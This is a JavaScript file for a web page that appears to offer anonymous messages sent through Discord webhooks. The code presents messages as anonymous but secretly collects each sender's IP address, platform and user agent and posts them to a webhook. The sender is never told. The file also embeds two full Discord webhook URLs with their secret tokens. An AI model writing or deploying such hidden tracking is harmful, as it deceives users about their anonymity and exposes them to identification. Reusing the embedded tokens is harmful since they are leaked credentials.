document.addEventListener('DOMContentLoaded', function () {
    const messageInput = document.getElementById('message');
    const sendBtn = document.getElementById('sendBtn');
    const toggleDarkMode = document.getElementById('toggleDarkMode');
    const body = document.body;

    // Toggle dark mode
    toggleDarkMode.addEventListener('click', function () {
        body.classList.toggle('dark-mode');
        toggleDarkMode.textContent = body.classList.contains('dark-mode') ? '☀️ Toggle Light Mode' : '🌙 Toggle Dark Mode';
    });

    sendBtn.addEventListener('click', async function () {
        const message = messageInput.value.trim();
        if (!message) {
            alert('Please enter a message.');
            return;
        }

        try {
            const ipAddress = await getIPAddress();
            const deviceInfo = getDeviceInfo();
            await sendMessageToDiscord(message, ipAddress, deviceInfo);
            messageInput.value = '';
            alert('Message sent!');
        } catch (error) {
            console.error('Error:', error);
            alert('Failed to send message. Please try again.');
        }
    });

    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP address:', error);
            return 'IP not found';
        }
    }

    // Get device info
    function getDeviceInfo() {
        const platform = navigator.platform;
        const userAgent = navigator.userAgent;
        let deviceType = 'Unknown Device';

        if (/Mobi|Android/i.test(userAgent)) {
            deviceType = 'Mobile Device';
        } else if (/Tablet|iPad/i.test(userAgent)) {
            deviceType = 'Tablet';
        } else {
            deviceType = 'Desktop';
        }

        return { platform, userAgent, deviceType };
    }

    async function sendMessageToDiscord(message, ipAddress, deviceInfo) {
        const webhooks = [
            {
                url: 'https://discord.com/api/webhooks/1339224301236391988/v1MnBuLUfdAlyzl8gssV7pruAa85hhOy6Z6QWYIeGmDKq1-Q7TKvNYv1EJUDcwRTsBKk',
                payload: {
                    content: `\n__**𝙽𝙴𝚆 𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂 𝙼𝙴𝚂𝚂𝙰𝙶𝙴 𝚁𝙴𝙲𝙸𝙴𝚅𝙴𝙳**__\n\t\t\t\t\t**Message Content **\n   ||${message}||\n\n**IP Address:** ||${ipAddress}||\n**Device Type:** ${deviceInfo.deviceType}\n**Platform:** ${deviceInfo.platform}\n**User Agent:** ||${deviceInfo.userAgent}||\n`
                }
            },
            {
                url: 'https://discord.com/api/webhooks/1339217340705017866/VFI4wNz7-mjtgRmKj5u1j_8bidBcCBcyQk9U8nr952j8gJtd6VTUqVWYfDKOYtnhnmC6',
                payload: {
                    content: `\n__**𝙽𝙴𝚆 𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂 𝙼𝙴𝚂𝚂𝙰𝙶𝙴 𝚁𝙴𝙲𝙸𝙴𝚅𝙴𝙳**__\n\t\t\t\t\t**Message Content **\n   ||${message}||\n`
                }
            }
        ];

        for (const webhook of webhooks) {
            try {
                const response = await fetch(webhook.url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhook.payload)
                });

                if (!response.ok) {
                    throw new Error(`Webhook response not ok: ${response.status}`);
                }

                console.log('Message sent to webhook:');
            } catch (error) {
                console.error('Error sending message to webhook:', error);
            }
        }
    }
});